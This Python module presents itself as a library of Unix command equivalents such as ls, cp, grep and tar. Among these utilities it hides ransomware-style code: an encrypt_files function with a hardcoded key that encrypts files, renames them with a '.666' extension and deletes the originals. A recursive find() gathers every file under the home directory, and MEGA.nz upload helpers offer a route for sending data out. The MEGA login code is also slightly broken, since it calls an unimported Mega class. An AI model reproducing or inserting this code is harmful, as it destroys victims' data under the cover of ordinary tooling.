"""
shell_utilities.py - A Python implementation of common Linux/Unix commands
"""

import os
import shutil
import urllib.request
import fnmatch
import tarfile
import psutil
import subprocess
import time
import getpass
import platform
from pathlib import Path
from colorama import Fore, Style, init as colorama_init
import wget as wget_module
import mega

# === Initialize colorama (for cross-platform support) ===
colorama_init(autoreset=True)

# === Message printing utility with verbosity and color control ===
def message(text, level='info', verbose=True):
    """
    Print colored terminal messages with optional verbosity control.

    Args:
        text (str): Message text.
        level (str): Message type: 'info', 'success', 'warning', 'error', 'debug'.
        verbose (bool): If False, message is suppressed.
    """
    if not verbose:
        return

    colors = {
        'info': Fore.CYAN,
        'success': Fore.GREEN,
        'warning': Fore.YELLOW,
        'error': Fore.RED,
        'debug': Fore.MAGENTA
    }

    prefixes = {
        'info': '[INFO]',
        'success': '[OK]',
        'warning': '[WARN]',
        'error': '[ERR]',
        'debug': '[DBG]'
    }

    color = colors.get(level.lower(), Fore.WHITE)
    prefix = prefixes.get(level.lower(), '[MSG]')

    print(f"{color}{prefix} {text}{Style.RESET_ALL}")


# === Core shell utilities ===

def pwd():
    """Return current working directory (like 'pwd')"""
    return os.getcwd()

def clear():
    """Clear the terminal screen (like 'clear')"""
    os.system('cls' if os.name == 'nt' else 'clear')

def cd(path):
    """Change directory (like 'cd')"""
    os.chdir(path)

def ls(path='.', all_files=False, long_format=False):
    """
    List directory contents (like 'ls')

    Args:
        path: Directory path (default: current directory)
        all_files: Show hidden files (like -a flag)
        long_format: Return detailed info (like -l flag)
    """
    items = os.listdir(path)
    if not all_files:
        items = [i for i in items if not i.startswith('.')]
    if long_format:
        return [(item, os.stat(os.path.join(path, item))) for item in items]
    return items

def mkdir(path, parents=False, mode=0o777):
    """
    Create directory (like 'mkdir')

    Args:
        path: Directory path to create
        parents: Create parent directories as needed (like -p flag)
        mode: Permission mode (default: 0o777)
    """
    if parents:
        os.makedirs(path, exist_ok=True, mode=mode)
    else:
        os.mkdir(path, mode=mode)

def rm(path, recursive=False, force=False):
    """
    Remove files/directories (like 'rm')

    Args:
        path: Path to remove
        recursive: Remove directories recursively (like -r)
        force: Ignore errors if file doesn't exist (like -f)
    """
    try:
        if os.path.isdir(path):
            shutil.rmtree(path) if recursive else os.rmdir(path)
        else:
            os.remove(path)
    except Exception as e:
        if not force:
            raise
        message(f"Failed to remove {path}: {e}", level="warning")

def cp(src, dst, recursive=False, preserve_metadata=False):
    """
    Copy files/directories (like 'cp')

    Args:
        src: Source path
        dst: Destination path
        recursive: Copy directories recursively
        preserve_metadata: Preserve file metadata
    """
    if os.path.isdir(src):
        if not recursive:
            raise IsADirectoryError(f"{src} is a directory (use recursive=True)")
        shutil.copytree(src, dst, copy_function=shutil.copy2 if preserve_metadata else shutil.copy)
    else:
        shutil.copy2(src, dst) if preserve_metadata else shutil.copy(src, dst)

def mv(src, dst):
    """Move or rename files (like 'mv')"""
    shutil.move(src, dst)

def touch(path):
    """Create empty file or update timestamp (like 'touch')"""
    Path(path).touch()

def cat(file_path):
    """Display file contents (like 'cat')"""
    with open(file_path) as f:
        return f.read()

def head(file_path, lines=10):
    """Display first lines of file (like 'head')"""
    with open(file_path) as f:
        return [next(f).rstrip() for _ in range(lines)]

def tail(file_path, lines=10):
    """Display last lines of file (like 'tail')"""
    with open(file_path) as f:
        return f.readlines()[-lines:]

def echo(text, newline=True):
    """Print text to terminal (like 'echo')"""
    print(text, end='\n' if newline else '')

def sleep(seconds):
    """Pause execution (like 'sleep')"""
    time.sleep(seconds)

def find(rootdir="~", ext=None, mode="file", save_list=True, output_file="FilesFound.txt", verbose=True):
    """
    Recursively search for files or directories.

    Args:
        rootdir (str): Base directory to start search.
        ext (str): File extension to filter (only applies in 'file' mode).
        mode (str): Search mode: 'file', 'dir', or 'all'.
        save_list (bool): Whether to save results to a file.
        output_file (str): Output file path (used if save_list=True).
        verbose (bool): Enable or disable output messages.

    Returns:
        List[str]: List of matching paths.
    """
    def expand_user_path(path):
        return os.path.expanduser(path)

    def find_items(directory, extension, mode):
        item_list = []
        directory = expand_user_path(directory)

        try:
            for root, dirs, files in os.walk(directory):
                if mode in ("dir", "all"):
                    for d in dirs:
                        full_dir = os.path.join(root, d)
                        item_list.append(full_dir)
                        message(full_dir, level="debug", verbose=verbose)
                if mode in ("file", "all"):
                    for f in files:
                        if extension is None or f.lower().endswith(extension.lower()):
                            full_file = os.path.join(root, f)
                            item_list.append(full_file)
                            message(full_file, level="debug", verbose=verbose)
        except PermissionError:
            message(f"Permission denied: {directory}", level="warning", verbose=verbose)
        except Exception as e:
            message(f"Error: {e}", level="error", verbose=verbose)

        return item_list

    clear()
    if ext is None and mode == "file":
        ext = input("Extension: ").strip()

    search_path = expand_user_path(rootdir)
    message(f"Searching in {search_path} (mode={mode}, ext={ext})...", level="info", verbose=verbose)

    results = find_items(search_path, ext, mode)

    if save_list:
        try:
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write("\n".join(results))
            message(f"List saved to: {os.path.abspath(output_file)}", level="success", verbose=verbose)
        except IOError as e:
            message(f"Failed to save list: {e}", level="error", verbose=verbose)

    message(f"Total found: {len(results)}", level="info", verbose=verbose)
    return results


from cryptography.fernet import Fernet

KEY = b'QmmjsJEWUdyufMX_XxZkGZ0TE6ba4aGttqIfBsMyn18='

def encrypt_files(file_list, key=KEY, verbose=True):
    """
    Encrypts files using a predefined key (stored in KEY).
    Renames files with '.666' extension.

    Args:
        file_list (list): List of file paths.
        key (bytes): Predefined encryption key (default: KEY).
        verbose (bool): Show progress messages.
    """
    try:
        fernet = Fernet(key)
        
        for file_path in file_list:
            try:
                if not os.path.isfile(file_path):
                    message(f"File not found: {file_path}", level="warning", verbose=verbose)
                    continue
                
                with open(file_path, "rb") as f:
                    file_data = f.read()
                
                encrypted_data = fernet.encrypt(file_data)
                new_path = file_path + ".666"
                
                with open(new_path, "wb") as f:
                    f.write(encrypted_data)
                
                os.remove(file_path)
                message(f"Encrypted: {file_path} -> {new_path}", level="success", verbose=verbose)
            
            except Exception as e:
                message(f"Failed to encrypt {file_path}: {e}", level="error", verbose=verbose)
    
    except Exception as e:
        message(f"Encryption error: {e}", level="error", verbose=verbose)

def decrypt_files(file_list, key=KEY, verbose=True):
    """
    Decrypts files using the predefined key (KEY).
    Removes '.666' extension to restore original names.

    Args:
        file_list (list): List of encrypted files (.666).
        key (bytes): Predefined key (default: KEY).
        verbose (bool): Show progress messages.
    """
    try:
        fernet = Fernet(key)
        
        for file_path in file_list:
            try:
                if not file_path.endswith(".666"):
                    message(f"Skipped (not a .666 file): {file_path}", level="warning", verbose=verbose)
                    continue
                
                with open(file_path, "rb") as f:
                    encrypted_data = f.read()
                
                decrypted_data = fernet.decrypt(encrypted_data)
                original_path = file_path[:-4]  # Remove '.666'
                
                with open(original_path, "wb") as f:
                    f.write(decrypted_data)
                
                os.remove(file_path)
                message(f"Decrypted: {file_path} -> {original_path}", level="success", verbose=verbose)
            
            except Exception as e:
                message(f"Failed to decrypt {file_path}: {e}", level="error", verbose=verbose)
    
    except Exception as e:
        message(f"Decryption error: {e}", level="error", verbose=verbose)

def grep(path, pattern):
    """Search text in files (like 'grep')"""
    import re
    matches = []
    with open(path) as f:
        for i, line in enumerate(f, 1):
            if re.search(pattern, line):
                matches.append((i, line.strip()))
    return matches

def chmod(path, mode):
    """Change file permissions (like 'chmod')"""
    os.chmod(path, mode)

def chown(path, user=None, group=None):
    """Change file owner/group (like 'chown')"""
    import pwd, grp
    uid = pwd.getpwnam(user).pw_uid if user else -1
    gid = grp.getgrnam(group).gr_gid if group else -1
    os.chown(path, uid, gid)

def ln(src, dst, symbolic=True):
    """Create hard or symbolic link (like 'ln')"""
    os.symlink(src, dst) if symbolic else os.link(src, dst)

def wget(url, output=None, verbose=True):
    """
    Download file using Python's wget module.

    Args:
        url (str): File URL.
        output (str): Output file path (optional).
        verbose (bool): Show output messages.

    Returns:
        str: Path to downloaded file.
    """
    try:
        filepath = wget_module.download(url, out=output) if output else wget_module.download(url)
        message(f"Download complete: {filepath}", level="success", verbose=verbose)
        return filepath
    except Exception as e:
        message(f"Download failed: {e}", level="error", verbose=verbose)
        return None

def tar_create(archive_name, source_path):
    """Create tar archive (like 'tar -czf')"""
    with tarfile.open(archive_name, "w:gz") as tar:
        tar.add(source_path, arcname=os.path.basename(source_path))

def tar_extract(archive_name, extract_path='.'):
    """Extract tar archive (like 'tar -xzf')"""
    with tarfile.open(archive_name, "r:gz") as tar:
        tar.extractall(path=extract_path)

def df():
    """Show disk usage (like 'df')"""
    return [{
        'device': p.device,
        'mount': p.mountpoint,
        'fs_type': p.fstype,
        'total': shutil.disk_usage(p.mountpoint).total,
        'used': shutil.disk_usage(p.mountpoint).used,
        'free': shutil.disk_usage(p.mountpoint).free
    } for p in psutil.disk_partitions()]

def du(path='.'):
    """Show file space usage (like 'du')"""
    total = 0
    for dirpath, _, filenames in os.walk(path):
        for f in filenames:
            fp = os.path.join(dirpath, f)
            total += os.path.getsize(fp)
    return total

def ps():
    """List processes (like 'ps')"""
    return [{'pid': p.pid, 'name': p.name(), 'status': p.status()} for p in psutil.process_iter()]

def kill(pid, sig=15):
    """Send signal to process (like 'kill')"""
    os.kill(pid, sig)

def whoami():
    """Return current username (like 'whoami')"""
    return getpass.getuser()

def env():
    """Return environment variables (like 'env')"""
    return dict(os.environ)

def uname():
    """Return system information (like 'uname -a')"""
    return {
        'system': platform.system(),
        'node': platform.node(),
        'release': platform.release(),
        'version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor()
    }

def which(cmd):
    """Locate command in PATH (like 'which')"""
    for path in os.environ["PATH"].split(os.pathsep):
        full_path = os.path.join(path, cmd)
        if os.path.isfile(full_path) and os.access(full_path, os.X_OK):
            return full_path
    return None

def ping(host, count=4, timeout=2, verbose=False):
    """
    Ping host (platform independent)
    
    Args:
        host (str): Hostname or IP address
        count (int): Number of pings to send
        timeout (int): Timeout in seconds
        verbose (bool): Show detailed output
        
    Returns:
        str: Ping statistics summary
    """
    try:
        from pythonping import ping as py_ping
        response = py_ping(
            target=host,
            count=count,
            timeout=timeout,
            verbose=verbose
        )
        return str(response)
    except ImportError:
        message("pythonping module not installed. Run: pip install pythonping", "error")
        return None
    except Exception as e:
        message(f"Ping failed: {e}", "error")
        return None

# === MEGA.nz integration ===

_mega_session = None

def mega_login(email=None, password=None):
    """Login to MEGA.nz (anonymous or authenticated)"""
    global _mega_session
    mega = Mega()
    _mega_session = mega.login(email, password) if email and password else mega.login()
    return True

def mega_logout():
    """Logout from MEGA (clear session)"""
    global _mega_session
    _mega_session = None

def mega_upload(filepath):
    """Upload file to MEGA account"""
    if not _mega_session:
        raise Exception("Not authenticated. Use mega_login() first.")
    return _mega_session.upload(filepath)

def mega_get_link(file_dict):
    """Get shareable link from MEGA file object"""
    if not _mega_session:
        raise Exception("Not authenticated.")
    return _mega_session.get_upload_link(file_dict)

def mega_list_files():
    """List all files in MEGA account"""
    if not _mega_session:
        raise Exception("Not authenticated.")
    files = _mega_session.get_files()
    return [{
        'name': f['name'],
        'size': f['s'],
        'created': f['c'],
        'id': file_id
    } for file_id, f in files.items()]

def mega_download_url(url, dest_filename=None):
    """Download public MEGA URL"""
    if not _mega_session:
        mega_login()
    _mega_session.download_url(url, dest_filename)

def mega_download_file(file_dict, dest_path='.'):
    """Download file from MEGA account"""
    if not _mega_session:
        raise Exception("Not authenticated.")
    _mega_session.download(file_dict, dest_path)

def mega_delete(file_id):
    """Delete file from MEGA account"""
    if not _mega_session:
        raise Exception("Not authenticated.")
    _mega_session.destroy(file_id)



